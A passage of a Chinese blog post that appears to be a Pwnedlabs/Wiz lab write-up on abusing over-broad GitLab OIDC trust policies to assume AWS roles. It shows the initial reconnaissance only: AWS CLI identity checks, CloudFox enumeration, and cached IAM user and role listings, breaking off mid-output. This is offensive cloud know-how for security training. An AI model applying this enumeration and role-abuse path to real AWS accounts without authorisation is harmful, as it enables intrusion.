<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【Pwnedlabs&amp;WIZ】Abuse OpenID Connect and GitLab for AWS Access &amp; Perimeter Leak | Yliken</title><meta name="author" content="Yliken"><meta name="copyright" content="Yliken"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Abuse OpenID Connect and GitLab for AWS Access利用 GitLab OIDC 与 AWS 角色信任链实现权限提升  Real-world context 通过 OpenID Connect (OIDC) 将 GitLab 与 AWS 集成时，组织通常会配置 IAM 信任策略，允许其 GitLab 组或组织下的所有存储库进行角色代入（例如，使用类似 的通配">
<meta property="og:type" content="article">
<meta property="og:title" content="【Pwnedlabs&amp;WIZ】Abuse OpenID Connect and GitLab for AWS Access &amp; Perimeter Leak">
<meta property="og:url" content="http://example.com/2025/09/23/%E4%BA%91/Abuse%20OpenID%20Connect%20and%20GitLab%20for%20AWS%20Access%20&%20Perimeter%20Leak/index.html">
<meta property="og:site_name" content="Yliken">
<meta property="og:description" content="Abuse OpenID Connect and GitLab for AWS Access利用 GitLab OIDC 与 AWS 角色信任链实现权限提升  Real-world context 通过 OpenID Connect (OIDC) 将 GitLab 与 AWS 集成时，组织通常会配置 IAM 信任策略，允许其 GitLab 组或组织下的所有存储库进行角色代入（例如，使用类似 的通配">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/essayhead/1.png">
<meta property="article:published_time" content="2025-09-22T16:00:00.000Z">
<meta property="article:modified_time" content="2025-09-26T13:15:25.166Z">
<meta property="article:author" content="Yliken">
<meta property="article:tag" content="aws">
<meta property="article:tag" content="pwnedlabs">
<meta property="article:tag" content="wiz">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/essayhead/1.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "【Pwnedlabs&WIZ】Abuse OpenID Connect and GitLab for AWS Access & Perimeter Leak",
  "url": "http://example.com/2025/09/23/%E4%BA%91/Abuse%20OpenID%20Connect%20and%20GitLab%20for%20AWS%20Access%20&%20Perimeter%20Leak/",
  "image": "http://example.com/img/essayhead/1.png",
  "datePublished": "2025-09-22T16:00:00.000Z",
  "dateModified": "2025-09-26T13:15:25.166Z",
  "author": [
    {
      "@type": "Person",
      "name": "Yliken",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/images/essayhead/favicon.ico"><link rel="canonical" href="http://example.com/2025/09/23/%E4%BA%91/Abuse%20OpenID%20Connect%20and%20GitLab%20for%20AWS%20Access%20&amp;%20Perimeter%20Leak/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          const hour = new Date().getHours()
          const isNight = hour <= 24 || hour >= 0
          if (theme === undefined) isNight ? activateDarkMode() : activateLightMode()
          else theme === 'light' ? activateLightMode() : activateDarkMode()
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '【Pwnedlabs&WIZ】Abuse OpenID Connect and GitLab for AWS Access & Perimeter Leak',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/wenzhang.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/essayhead/second.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">63</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">32</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-file-alt"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-scroll"></i><span> 阅读札记</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/reading/Whispers-of-Midie/"><i class="fa-fw fas fa-feather-alt"></i><span> 蝶梦笔语</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/memories/gallery/"><i class="fa-fw fas fa-images"></i><span> 图集</span></a></li><li><a class="site-page child" href="/memories/thoughts/"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span></a></li><li><a class="site-page child" href="/memories/plantRedBean/"><i class="fa-fw fas fa-seedling"></i><span> 红豆物语</span></a></li><li><a class="site-page child" href="/memories/unposted-wishes/"><i class="fa-fw fas fa-scroll"></i><span> 未寄之愿</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/essayhead/1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/essayhead/second.jpg" alt="Logo"><span class="site-name">Yliken</span></a><a class="nav-page-title" href="/"><span class="site-name">【Pwnedlabs&amp;WIZ】Abuse OpenID Connect and GitLab for AWS Access &amp; Perimeter Leak</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-file-alt"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-scroll"></i><span> 阅读札记</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/reading/Whispers-of-Midie/"><i class="fa-fw fas fa-feather-alt"></i><span> 蝶梦笔语</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/memories/gallery/"><i class="fa-fw fas fa-images"></i><span> 图集</span></a></li><li><a class="site-page child" href="/memories/thoughts/"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span></a></li><li><a class="site-page child" href="/memories/plantRedBean/"><i class="fa-fw fas fa-seedling"></i><span> 红豆物语</span></a></li><li><a class="site-page child" href="/memories/unposted-wishes/"><i class="fa-fw fas fa-scroll"></i><span> 未寄之愿</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">【Pwnedlabs&amp;WIZ】Abuse OpenID Connect and GitLab for AWS Access &amp; Perimeter Leak</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-09-22T16:00:00.000Z" title="发表于 2025-09-23 00:00:00">2025-09-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-09-26T13:15:25.166Z" title="更新于 2025-09-26 21:15:25">2025-09-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/">云安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">8.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>46分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="Abuse-OpenID-Connect-and-GitLab-for-AWS-Access"><a href="#Abuse-OpenID-Connect-and-GitLab-for-AWS-Access" class="headerlink" title="Abuse OpenID Connect and GitLab for AWS Access"></a>Abuse OpenID Connect and GitLab for AWS Access</h2><p>利用 GitLab OIDC 与 AWS 角色信任链实现权限提升</p>
<blockquote>
<p><strong>Real-world context</strong></p>
<p>通过 OpenID Connect (OIDC) 将 GitLab 与 AWS 集成时，组织通常会配置 IAM 信任策略，允许其 GitLab 组或组织下的所有存储库进行角色代入（例如，使用类似 的通配符<code>project_path:my-org/*</code>）。虽然这可以简化 CI&#x2F;CD 的入门，但可能会带来严重的安全漏洞。</p>
<p>如果GitLab 组下的<strong>任何</strong>项目遭到入侵——无论是通过恶意贡献者、易受攻击的管道还是钓鱼的开发人员——攻击者都可以利用共享的 OIDC 信任来承担 AWS 角色。由于该角色被授予<strong>组织内的任何项目</strong>，因此攻击者无需访问最高权限或敏感的存储库——<strong>任何低权限或休眠的存储库都可能成为可行的攻击媒介。</strong></p>
<p>以下事实加剧了这种风险：</p>
<ul>
<li>AWS 账户 ID 是公开的，很容易被发现。</li>
<li>无需用户交互，即可在 CI 作业中生成来自 GitLab 的 OIDC 令牌。</li>
<li>GitLab 不会在 AWS 级别强制执行细粒度的控制 -<strong>这取决于信任策略来限制范围。</strong></li>
</ul>
<blockquote>
<p>为了解决这些模式的广泛滥用问题，AWS<a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_oidc_secure-by-default.html">于 2025 年 6 月更新了其 IAM 行为，</a>要求默认安全条件。信任共享 OIDC 提供商（例如 ）的新角色或已修改的角色必须验证<strong>和 等</strong><code>gitlab.com</code> **声明<code>sub aud</code>**，否则 API 调用将失败。</p>
</blockquote>
</blockquote>
<p>入口只给了一个AK&#x2F;SK</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221736463.png" alt="image-20250922173555322"></p>
<h3 id="初始信息收集"><a href="#初始信息收集" class="headerlink" title="初始信息收集"></a>初始信息收集</h3><p><code>aws sts get-caller-identity</code>查看一下当前的用户信息</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AIDAYLH5JA4JLMXUMN2OK&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="string">&quot;573909305106&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:user/pentester&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后运行<code>aws iam list-attached-user-policies --user-name pentester</code>与<code>aws iam list-user-policies --user-name pentester</code>想要查看一下当前用户有什么托管策略和内联策略</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP-40PQI58C:~/aws$ aws iam list-attached-user-policies --user-name pentester</span><br><span class="line"></span><br><span class="line">An error occurred (AccessDenied) when calling the ListAttachedUserPolicies operation: User: arn:aws:iam::573909305106:user/pentester is not authorized to perform: iam:ListAttachedUserPolicies on resource: user pentester because no identity-based policy allows the iam:ListAttachedUserPolicies action</span><br><span class="line"></span><br><span class="line">yliken@LAPTOP-40PQI58C:~/aws$ aws iam list-user-policies --user-name pentester</span><br><span class="line"></span><br><span class="line">An error occurred (AccessDenied) when calling the ListUserPolicies operation: User: arn:aws:iam::573909305106:user/pentester is not authorized to perform: iam:ListUserPolicies on resource: user pentester because no identity-based policy allows the iam:ListUserPolicies action</span><br></pre></td></tr></table></figure>

<p>但是当前用户并没有查看这些策略的权限</p>
<p>可以使用开源命令行工具<a target="_blank" rel="noopener" href="https://github.com/BishopFox/cloudfox">CloudFox</a>来获取此 AWS 环境中的态势感知。并获取尽可能多的信息以查找潜在的攻击路径和错误配置。</p>
<blockquote>
<p>CloudFox 是由 Bishop Fox 团队开发的开源云安全评估工具。它能够自动收集和分析云环境中的资源信息、IAM 用户和角色，并进行权限分析和潜在权限提升检测。虽然主要针对 AWS 平台，但它也支持对其他云平台的安全评估，帮助安全专业人员快速识别跨云环境中的风险。</p>
</blockquote>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221908431.png" alt="image-20250922190814332"></p>
<p>扫描完成之后就会将结果保存到家目录下</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202509221918451.png" alt="image-20250922191812404"></p>
<p>这里我们只关心用户权限的结果</p>
<p>除了AWS管理账户外有三个用户<code>bob</code> <code>louise</code> <code>pentester</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>~/.cloudfox/cached-data/aws/<span class="number">573909305106</span>$ cat <span class="number">573909305106</span>-iam-ListUsers.json</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Value&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:user/awsmanagementuser&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-12-19T08:57:11Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AIDAYLH5JA4JO26LTNAGY&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;awsmanagementuser&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PasswordLastUsed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PermissionsBoundary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:user/bob&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-22T09:01:45Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AIDAYLH5JA4JGSGBS7WNN&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bob&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PasswordLastUsed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PermissionsBoundary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:user/louise&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-22T09:01:45Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AIDAYLH5JA4JJROTE6J5D&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;louise&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PasswordLastUsed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PermissionsBoundary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:user/pentester&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-22T09:01:45Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;UserId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AIDAYLH5JA4JLMXUMN2OK&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pentester&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PasswordLastUsed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PermissionsBoundary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Exp&quot;</span><span class="punctuation">:</span> <span class="number">1758546399764764091</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>除了AWS内置的角色之外</p>
<p>还有<code>engineering</code> <code>gitlab_terraform_deploy</code> <code>OrganizationAccountAccessRole</code>这是哪个角色</p>
<p><code>engineering</code> 显示 <code>bob</code> 和 <code>louise</code> 可以扮演此角色</p>
<p><code>gitlab_terraform_deploy</code>允许 GitLab 通过 OIDC Web Identity Token 扮演角色</p>
<p><code>OrganizationAccountAccessRole</code>允许 AWS Organizations 根账号或主账号跨账户访问</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>~/.cloudfox/cached-data/aws/<span class="number">573909305106</span>$ cat <span class="number">573909305106</span>-iam-ListRoles.json</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Value&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:role/aws-service-role/access-analyzer.amazonaws.com/AWSServiceRoleForAccessAnalyzer&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-06T20:25:28Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/aws-service-role/access-analyzer.amazonaws.com/&quot;</span><span 